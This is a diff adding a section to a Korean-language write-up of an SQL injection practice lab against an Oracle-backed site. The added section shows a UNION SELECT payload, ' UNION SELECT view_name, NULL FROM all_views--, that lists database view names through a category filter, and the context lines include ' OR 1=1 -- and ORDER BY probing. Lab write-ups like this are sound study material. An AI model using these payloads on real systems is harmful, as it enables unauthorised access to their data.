@@ -55,6 +55,20 @@ filter?category=' OR 1=1 --
 
 세 번째 입력값인 `' ORDER BY 3 --`을 시도했을 때 화면에 `Internal Server Error`가 표시되었다.
 
+### 3. `UNION SELECT`로 뷰 이름 조회 성공
+
+다음 입력값을 상품 카테고리 필터에 넣어 뷰 이름 조회를 시도했다.
+
+```sql
+' UNION SELECT view_name, NULL FROM all_views--
+```
+
+**관찰 결과**
+
+뷰 이름을 얻는 데 성공했다. 화면에 `ALL_ALL_TABLES`, `ALL_ANNOTATION_TEXT_METADATA`, `ALL_APPLY` 등의 뷰 이름이 표시되었다.
+
+![UNION SELECT로 뷰 이름 조회에 성공한 화면](images/lab-querying-database-version-oracle/01-union-select-view-names.png)
+
 ## 해결 과정
 
 ## 배운 점
